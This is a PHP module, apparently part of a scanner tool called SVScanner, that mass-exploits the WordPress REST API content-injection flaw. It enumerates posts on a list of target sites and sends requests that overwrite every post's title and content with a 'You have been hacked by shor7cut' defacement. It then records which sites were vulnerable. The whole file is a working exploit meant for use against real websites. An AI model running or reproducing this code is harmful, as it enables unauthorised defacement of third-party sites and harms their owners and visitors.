<?php
error_reporting(0);
/**
 * @Author: Eka Syahwan
 * @Date:   2018-09-06 23:02:10
 * @Last Modified by:   shor7cut
 * @Last Modified time: 2018-09-16 13:09:30
 */
class Exploit_wp_content_injection
{
	function __construct()
	{
		$this->wploit_modules 	= new wploit_modules;
		$this->sdata 			= new Sdata;
		$this->database 		= new Database;
	}
	function scanner($array_url , $datcommand){
		##########################################################################
		mkdir("result");
		mkdir("result/exploit");
		mkdir("result/exploit/wordpress");
		$fopn = fopen("result/exploit/wordpress/wp-content-injection.txt", "a+");
		##########################################################################
		echo "\r\n".$this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Trying search vulnerable ... [ ".count($array_url)." Request | ".$datcommand."]\r\n");
		foreach ($array_url as $key => $dataURL) {
			$url[] 				=  array('url' 		=> $dataURL['url']."/wp-json/wp/v2/posts");
			$hea[] 				=  array('follow' 	=> false,'rto'=>5);
		}
		$respons   			= $this->sdata->sdata($url,$hea); $this->sdata->session_remove($respons);unset($url);unset($hea);
		foreach ($respons as $key => $data) {
			$json = json_decode($data['respons'],true);
			if(!empty($json[0][id])){
				foreach ($json as $key => $makeIT) {
					$url[] = array('url' => $data['data']['url']."/".$makeIT['id']);
					$hea[] = array('follow' 	=> false,'rto'=> 10,'post' => "{\r\n    \"id\":\"".$makeIT['id']."\",\r\n    \"title\":\"You have been hacked by shor7cut\",\r\n    \"content\":\"Please update your wordpress version\"\r\n \r\n  }");
				}
			}
		}
		if(empty($url)){
			echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy",count($url)." request , no one is vulnerable\r\n");
		}else{
			echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Trying exploits vulnerable ... [ ".count($url)." Request ]\r\n");
			$respons = $this->sdata->sdata($url,$hea); $this->sdata->session_remove($respons);unset($url);unset($hea);
			foreach ($respons as $key => $res) {
				if( preg_match("/rest_cannot/", $res['respons']) ){
					echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$res['info']['http_code']."] ".$res['info']['url'])." => ".$this->wploit_modules->color("green","[ NOT VULN ]")."\r\n";
				}else{

					if(preg_match("/shor7cut/", $res['respons'])){
						echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$res['info']['http_code']."] ".str_replace("/index.php?p=", "/wp-json/wp/v2/posts", $res['info']['url']) )." => ".$this->wploit_modules->color("green","[ VULN]")."\r\n";
						fwrite($fopn, str_replace("/index.php?p=", "/wp-json/wp/v2/posts", $res['info']['url'])."\r\n");
					}else{
						echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$res['info']['http_code']."] ".$res['info']['url'])." => ".$this->wploit_modules->color("green","[ NOT VULN ]")."\r\n";
					}
				}
			}			
		}
		fclose($fopn);
	}
}